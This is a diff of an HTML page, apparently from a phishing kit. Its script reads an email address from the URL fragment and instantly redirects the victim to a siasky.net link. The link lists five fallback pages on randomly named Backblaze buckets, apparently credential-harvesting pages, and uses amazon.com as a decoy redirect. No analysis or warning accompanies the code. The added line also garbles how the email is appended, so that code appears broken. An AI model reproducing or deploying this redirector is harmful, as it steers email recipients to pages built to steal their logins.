@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://siasky.net/LAB0Czr48wH1b1KQG9TMRAS6WMQ3H4napMf0lp9bu8zTzQ?key=d26e3fe101fa8ca273483154c88695259e354a73&url_01=https://bourgeoisify-choledoch-nihilism.s3.eu-central-003.backblazeb2.com/index.html&url_02=https://cathismata-ketchcraft-scaphoceritic.s3.eu-central-003.backblazeb2.com/index.html&url_03=https://deformative-lupoma-reitbok.s3.eu-central-003.backblazeb2.com/index.html&url_04=https://fleeciest-miscontent-twistiness.s3.eu-central-003.backblazeb2.com/index.html&url_05=https://murciana-overglazes-transom.s3.eu-central-003.backblazeb2.com/index.html&redirect=https://www.amazon.com"+ "#" + em;
+			window.location.href = "https://siasky.net/LAB0Czr48wH1b1KQG9TMRAS6WMQ3H4napMf0lp9bu8zTzQ?key=d26e3fe101fa8ca273483154c88695259e354a73&url_01=https://bourgeoisify-choledoch-nihilism.s3.eu-central-003.backblazeb2.com/index.html&url_02=https://cathismata-ketchcraft-scaphoceritic.s3.eu-central-003.backblazeb2.com/index.html&url_03=https://deformative-lupoma-reitbok.s3.eu-central-003.backblazeb2.com/index.html&url_04=https://fleeciest-miscontent-twistiness.s3.eu-central-003.backblazeb2.com/index.html&url_05=https://murciana-overglazes-transom.s3.eu-central-003.backblazeb2.com/index.html&redirect=https://www.amazon.com"+ + em;
 		}, 0);
 	</script>
 </html>
